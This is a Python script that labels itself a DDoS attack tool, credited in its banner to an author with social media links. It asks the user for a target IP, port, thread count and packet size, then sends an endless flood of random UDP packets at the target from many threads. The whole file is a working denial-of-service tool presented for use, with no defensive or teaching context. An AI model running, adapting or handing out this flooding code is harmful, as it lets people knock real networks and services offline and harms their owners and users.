import sys
import time
import socket
import random
import threading

def print_banner():
    print("*************************************************")
    print("*              DDos Attack Script               *")
    print("*************************************************")
    print("* Author   : HA-MRX                             *")
    print("* YouTube  : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA *")
    print("* GitHub   : https://github.com/Ha3MrX          *")
    print("* Facebook : https://www.facebook.com/muhamad.jabar222 *")
    print("*************************************************")

def attack(ip, port, num_threads, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(packet_size)
    sent = 0
    try:
        while True:
            for _ in range(num_threads):
                t = threading.Thread(target=send_packet, args=(sock, ip, port, bytes))
                t.start()
                sent += 1
                print(f"Sent {sent} packets to {ip} through port {port}")
    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
        sys.exit()

def send_packet(sock, ip, port, bytes):
    try:
        sock.sendto(bytes, (ip, port))
    except socket.error as e:
        print(f"Error sending packet: {e}")

def main():
    print_banner()
    ip = input("Enter target IP address: ")
    port = int(input("Enter target port: "))
    num_threads = int(input("Enter number of threads: "))
    packet_size = int(input("Enter packet size (in bytes): "))
    
    try:
        print("\nStarting the attack...\n")
        attack(ip, port, num_threads, packet_size)
    except socket.gaierror:
        print("Invalid IP address. Please enter a valid IP.")
    except KeyboardInterrupt:
        print("\nExiting the program...")
        sys.exit()

if __name__ == "__main__":
    main()
